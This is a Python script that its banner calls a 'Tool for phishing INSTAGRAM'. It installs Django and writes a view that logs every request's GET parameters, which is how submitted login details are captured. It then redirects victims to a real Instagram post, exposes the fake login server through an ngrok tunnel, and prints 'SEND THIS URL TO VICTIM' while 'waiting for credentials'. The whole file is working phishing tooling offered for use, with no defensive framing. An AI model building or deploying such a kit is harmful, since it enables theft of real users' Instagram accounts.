import subprocess, os
import sys
from pyngrok import ngrok

import time

os.system('clear')
banner="""


             ░▀░ █▀▀▄ ▀▄▒▄▀ ▀▀█▀▀ █▀▀█ █▀▀▀ █▀▀█ █▀▀█ █▀▄▀█ 
             ▀█▀ █░░█ ░▒█░░ ░░█░░ █▄▄█ █░▀█ █▄▄▀ █▄▄█ █░▀░█ 
             ▀▀▀ ▀░░▀ ▄▀▒▀▄ ░░▀░░ ▀░░▀ ▀▀▀▀ ▀░▀▀ ▀░░▀ ▀░░░▀
                                                           v0.01
                          \033[92mTool for phishing INSTAGRAM purely out of python!
                          Made by L1NUXMALLU
                          Turn ON your mobile hotspot before going further!\033[00m"""
print(banner)
def clear():
	os.system('clear')
	print(banner)

def findpython():
	python = ''

	for i in ['python','python3']:
		if int(subprocess.getoutput(i+' -V').strip('Python ').replace('.','')[0])>2:
			python = i
			break 
	return python
r = input("""\n\n\033[96m  Enter 'r' to Run setup \033[00m>> """)

if r.lower() == 'r':
	print("""\033[92m
               installing.....
                      \033[00m""")
else:
	print("\n\n\n\033[91m             Process ABORTED!! \033[00m \n\n")
	exit()



subprocess.call(findpython()+' -m pip install virtualenv',shell=True)
subprocess.call('virtualenv env',shell=True)
subprocess.call('. env/bin/activate',shell=True)
subprocess.call(findpython()+' -m pip install django',shell=True)
clear()

url = input("""\n\n\033[94m 
 Enter any Instagram post/story Url to redirect the LOGIN button \033[00m \n
       >> """)
if not os.path.isdir('app'):
	os.makedirs('app')

with open('app/views.py','w') as f:
	f.write('''
from django.shortcuts import render,redirect

def main(request):
 print(request.GET)
 return render(request, "app.html")

def com(request):
 return redirect("%s")'''%(url))

time.sleep(2)

ngurl = ngrok.connect(4863)
clear()
print("""\n

         SEND THIS URL TO VICTIM

         >> :\033[93m  %s \033[00m

            waiting for credentials.... \n"""% (ngurl))

subprocess.call(findpython()+' manage.py runserver 0.0.0.0:4863',shell=True)

